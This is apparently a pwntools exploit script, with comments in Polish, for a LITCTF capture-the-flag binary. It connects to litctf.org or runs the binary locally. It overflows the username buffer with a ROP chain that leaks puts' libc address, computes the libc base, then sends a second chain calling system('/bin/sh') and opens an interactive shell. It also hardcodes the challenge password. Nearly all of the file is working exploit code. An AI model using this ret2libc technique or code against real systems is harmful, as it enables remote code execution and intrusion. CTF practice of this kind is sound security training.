from pwn import *             

#-
#readelf -s training
#context.log_level='debug'      #
#context.log_level = 'info'
#context.log_level = 'warning' 

""" - jezeli chcemy od samego poczatku debugowac
p = gdb.debug('./tiny', '''
    # Tutaj wpisujesz komendy do GDB
    b *0x401000    
''')
"""

context.update(arch='x86_64', os='linux') 
context.terminal = ['wt.exe','wsl.exe'] 

# HOST="nc 34.252.33.37 32166"
# ADDRESS,PORT=HOST.split()[1:]

#zmienne srodowiskowe
#env = os.environ.copy()
#env["FLAG_VAL"] = "AAAA"

HOST="litctf.org:31779"
ADDRESS,PORT=HOST.split(":")

BINARY_NAME="./lit"
binary = context.binary = ELF(BINARY_NAME, checksec=False)
#libc  = ELF('./libc.so.6', checksec=False)
libc  = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6', checksec=False)


if args.REMOTE:
    p = remote(ADDRESS,PORT)
    #p = remote(ADDRESS,PORT,ssl=True)
else:
    p = process(binary.path)    

# gdb.attach(p,'''
# b *0x004012b8
# ''')
# pause(3)

main=binary.sym.main

puts_got=binary.got.puts
puts_plt=binary.plt.puts

#payload1 = length * b"A"+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)

#payload=b'LITCTF'+b'\x00'+b'A'*87
#payload = b'LITCTF' + b'\x00' + 25*b'a'+49*b'b'
rop = ROP(binary)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret=rop.find_gadget(['ret'])[0]

payload = b'LITCTF' + b'\x00' + 33*b'a'+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)
p.sendlineafter(b'Enter username:',payload)
payload=b'd0nt_57r1ngs_m3_3b775884'
p.sendlineafter(b'Enter password:',payload)
p.recvuntil(b'Goodbye')
p.recvline()
puts_got_addr=u64(p.recvline().strip().ljust(8,b'\x00'))
warn (f"puts_got_addr: {puts_got_addr:#x}")

libc.address=puts_got_addr-0x87be0
system=libc.symbols.system
warn (f"libc: {libc.address:#x}")
str_bin_sh=next(libc.search(b'/bin/sh'))
info (f"system: 0x{system:x}")

payload = b'LITCTF' + b'\x00' + 33*b'a'+p64(ret)+p64(pop_rdi)+p64(str_bin_sh)+p64(system)
p.sendlineafter(b'Enter username:',payload)
payload=b'd0nt_57r1ngs_m3_3b775884'
p.sendlineafter(b'Enter password:',payload)


#payload2 = length * b"A"+p64(ret)
# p.sendline(payload2)

p.interactive()